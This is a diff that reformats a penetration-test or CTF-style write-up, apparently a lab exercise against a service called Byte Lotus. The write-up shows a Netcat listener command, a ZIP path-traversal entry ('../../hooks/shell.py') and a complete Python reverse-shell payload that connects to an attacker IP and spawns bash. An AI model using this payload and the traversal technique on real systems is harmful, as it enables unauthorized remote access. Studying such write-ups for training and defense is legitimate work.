@@ -282,16 +282,15 @@ I chose port:
 
 I started a Netcat listener on my attacking machine:
 
-nc -lvnp 4444
-
+`nc -lvnp 4444`
 
 I then created a malicious ZIP archive containing a valid shell.json and a Python reverse-shell payload at:
 
-../../hooks/shell.py
-
+`../../hooks/shell.py`
 
 The Python script was:
 
+---
 import os
 import pty
 import socket
@@ -301,38 +300,38 @@ sock.connect(("192.168.134.177", 4444))
 
 for descriptor in (0, 1, 2):
 	os.dup2(sock.fileno(), descriptor)
-	
 	pty.spawn("/bin/bash")
+---
+	
+The important part was the ZIP path:	
+
+`../../hooks/shell.py`
 	
 	
-	The important part was the ZIP path:
+This caused the file to escape the normal shell extraction directory and land directly inside the directory monitored by the 
+theme worker.
 	
-	../../hooks/shell.py
+I uploaded the malicious ZIP through the Byte Lotus dashboard.
 	
+After a few seconds, the background worker picked up the Python file and executed it.
 	
-	This caused the file to escape the normal shell extraction directory and land directly inside the directory monitored by the theme worker.
+My listener received the incoming connection.
 	
-	I uploaded the malicious ZIP through the Byte Lotus dashboard.
+I had obtained a reverse shell.
+
+---
+
+## Shell Access
 	
-	After a few seconds, the background worker picked up the Python file and executed it.
+The reverse shell was running as:
 	
-	My listener received the incoming connection.
+`roomservice`
 	
-	I had obtained a reverse shell.
+I confirmed the current user:
 	
-	Shell Access
+`whoami`
 	
-	The reverse shell was running as:
-	
-	roomservice
-	
-	
-	I confirmed the current user:
-	
-	whoami
-	
-	
-	The result was:
+The result was:
 	
 	roomservice
 	
